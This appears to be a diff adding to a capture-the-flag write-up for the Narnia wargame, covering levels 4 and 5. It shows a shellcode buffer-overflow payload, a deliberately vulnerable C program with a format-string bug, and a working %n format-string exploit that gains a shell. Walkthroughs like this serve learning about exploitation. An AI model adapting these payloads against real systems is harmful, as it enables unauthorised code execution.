@@ -233,4 +233,43 @@ I ran that and it worked in GDB!  When I ran it from the prompt it did not, pres
 ````perl -e 'print "\x90"x144 . "\x31\xc0\x50\x68\x2f\x2f\x73" . "\x68\x68\x2f\x62\x69\x6e\x89" . "\xe3\x89\xc1\x89\xc2\xb0\x0b" ."\xcd\x80\x31\xc0\x40\xcd\x80" . "B"x100 . "\x7c\xd5\xff\xff"'````
 And finally it worked!
 #Level5
+````
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
 
+int main(int argc, char **argv){
+        int i = 1;
+        char buffer[64];
+
+        snprintf(buffer, sizeof buffer, argv[1]);
+        buffer[sizeof (buffer) - 1] = 0;
+        printf("Change i's value from 1 -> 500. ");
+
+        if(i==500){
+                printf("GOOD\n");
+                system("/bin/sh");
+        }
+
+        printf("No way...let me give you a hint!\n");
+        printf("buffer : [%s] (%d)\n", buffer, strlen(buffer));
+        printf ("i = %d (%p)\n", i, &i);
+        return 0;
+}
+```
+The goal here is to overflow buffer[64] and overwrite i with 500.  The program is using the safer version of printf by using snprintf which will print out a maximum of sizeof(buffer) bytes.
+I'm guessing the solution has to do with using format strings in the snprintf call so I took a look at http://www.cis.syr.edu/~wedu/Teaching/cis643/LectureNotes_New/Format_String.pdf
+Using that guide I see I can print out the values of the stack
+```
+narnia5@narnia:/narnia$ ./narnia5 0x%08x0x%08x0x%08x0x%08x0x%08x
+Change i's value from 1 -> 500. No way...let me give you a hint!
+buffer : [0xf7eb87160xffffffff0xffffd74e0xf7e30c340x37667830] (50)
+i = 1 (0xffffd76c)
+```
+Page 14 from https://crypto.stanford.edu/cs155old/cs155-spring08/papers/formatstring-1.2.pdf does a good job of explaining how we can write to a memory location using the %n formatter.
+```
+./narnia5 `perl -e 'print "\x6c\xd7\xff\xff" . "%x%x%x%472d%n"'
+```
+Note: 472=500-(4 bytes for ret + 24 bytes (8 bytes for each of the three %x's returned)
+This command worked and I was now narnia6!
+#Level6
